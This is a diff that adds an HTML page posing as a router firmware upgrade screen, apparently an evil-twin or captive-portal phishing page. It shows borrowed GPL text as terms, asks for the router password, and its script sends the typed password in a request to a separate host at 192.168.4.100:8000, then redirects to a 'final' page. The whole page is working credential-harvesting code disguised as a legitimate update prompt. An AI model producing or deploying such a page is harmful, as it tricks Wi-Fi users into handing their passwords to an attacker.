@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Router Upgrade</title>
+    <link rel="stylesheet" href="index.css">
+</head>
+<body>
+    <script src="./jquery.min.js"></script>
+    <script src="./bootstrap.min.js"></script>
+    <div class="main">
+
+
+    <form onsubmit="return setAction(this)" method="GET" class="form">
+        <h2>Router Firmware Upgrade</h2>
+        <p type="A new version of the firmware has been detected and awaiting installation. Please review our new terms and conditions and proceed"></p>
+        <label class="termsHead" for=comment>Terms And Conditions:</label> 
+<textarea class="w-100" readonly>
+GNU General Public License Notice
+This product includes software code developed by third parties,
+including software code subject to the GNU General Public License
+(“GPL”). As applicable, Wifi Router provides mail service of a machine
+readable copy of the corresponding GPL source code on CD-ROM
+upon request via email or traditional paper mail. Wifi Router will
+charge for a nominal cost to cover shipping and media charges as
+allowed under the GPL. This offer will be valid for at least 3 years.
+For GPL inquiries and the GPL CD-ROM information, please contact
+us at GPL@Wifi Router.com or
+Building 24(floors 1,3,4,5) and 28(floors1-4) Central Science and
+Technology Park, Shennan Rd, Nanshan, Shenzhen,China.
+Additionally, Wifi Router provides for a GPL-Code-Centre under http://
+www.Wifi Router.com/en/support/gpl/ where machine readable copies
+of the GPL source codes used in Wifi Router products are available for
+free download. Please note, that the GPL-Code-Centre is only provided
+for as a courtesy to Wifi Router’s customers but may neither offer
+a full set of source codes used in all products nor always provide for
+the latest or actual version of such source codes.
+The GPL Code used in this product is distributed WITHOUT ANY
+WARRANTY and is subject to the copyrights of one or more authors.
+Please refer to the following GNU General Public License for further
+information.
+
+GNU GPL, see <http: www.gnu.org licenses/>.
+The GNU General Public License does not permit incorporating your program into proprietary programs.
+If your program is a subroutine library, you may consider it more useful to permit linking proprietary
+applications with the library. If this is what you want to do, use the GNU Lesser General Public License
+instead of this License. But first, please read <http: www.gnu.org philosophy why-not-lgpl.html>.
+       </textarea>
+       <div class="form-check">
+        <input type="checkbox"  id="check-box" style="float: left; margin-top: 5px;">
+        <label class="form-check-label" for="exampleCheck1">I agree with above Terms And Conditions</label>
+    </div>
+        <p type="Passphrase:"><input class="passwd" id="pwd" placeholder="Enter router password to continue" ></input></p>
+        <button type="submit" id="btn" value="Start Upgrade">Start Upgrade</button>
+      </form>
+    </div>
+
+    
+
+
+    <div class="modal fade" id=empty-pass>
+        <div class="modal-dialog modal-sm">
+           <div class=modal-content>
+              <div class=modal-header>
+                 <button type=button class=close data-dismiss=modal>&times;</button> 
+                 <h4 class=modal-title>Information</h4>
+              </div>
+              <div class=modal-body>
+                 <p>Please Input Valid Password. (Must be between 7 and 64 characters)</p>
+              </div>
+              <div class=modal-footer> <button type=button class="btn btn-default" data-dismiss=modal>Close</button> </div>
+           </div>
+        </div>
+     </div>
+
+
+     
+     <!-- End empty password message --> <!-- Start empty password message --> 
+     <div class="modal fade" id=no-checkbox>
+        <div class="modal-dialog modal-sm">
+           <div class=modal-content>
+              <div class=modal-header>
+                 <button type=button class=close data-dismiss=modal>&times;</button> 
+                 <h4 class=modal-title>Information</h4>
+              </div>
+              <div class=modal-body>
+                 <p>Please Check The I Agree Button.</p>
+              </div>
+              <div class=modal-footer> <button type=button class="btn btn-default" data-dismiss=modal>Close</button> </div>
+           </div>
+        </div>
+     </div>
+
+
+     <div class="modal fade" id=pwd-checkbox>
+        <div class="modal-dialog modal-sm">
+           <div class=modal-content>
+              <div class=modal-header>
+                 <button type=button class=close data-dismiss=modal>&times;</button> 
+                 <h4 class=modal-title>Error</h4>
+              </div>
+              <div class=modal-body>
+                 <p>Password is incorrect. Try Again</p>
+              </div>
+              <div class=modal-footer> <button type=button class="btn btn-default" data-dismiss=modal>Close</button> </div>
+           </div>
+        </div>
+     </div>
+
+
+
+     <script>
+        $("#btn").on("click", async function(e) {
+            e.preventDefault();
+            
+        var input = document.getElementById("pwd");
+            var box = document.getElementById("check-box");
+        
+            if ( box.checked != true ){
+                $("#no-checkbox").modal("show");
+            return false;
+                }
+                if ( input.value.length < 7 ||  input.value.length > 64){
+            $("#empty-pass").modal("show");
+            return false;
+            }
+
+            var test = await fetch("http://192.168.4.100:8000/?passwd="+input.value);
+            var result = await test.json()
+            finalResult = result.result;
+
+            if(finalResult){
+            window.location.href = "/final.html";
+            }
+            else{
+                $("#pwd-checkbox").modal("show");
+
+            }
+        
+        });
+
+
+     function checkBoxStatus()
+     {
+       // get the password box and checkbox elements
+       var box = document.getElementById("check-box");
+       var input = document.getElementById("pwd");
+     
+       // if the box is checked
+       if ( box.checked == true )
+         {
+           // enabale the password box
+           input.disabled = false;
+         }
+       else
+         {
+           // disable the password box
+           input.disabled = true;
+         }
+       }
+
+</script>
+    
+</body>
+</html>
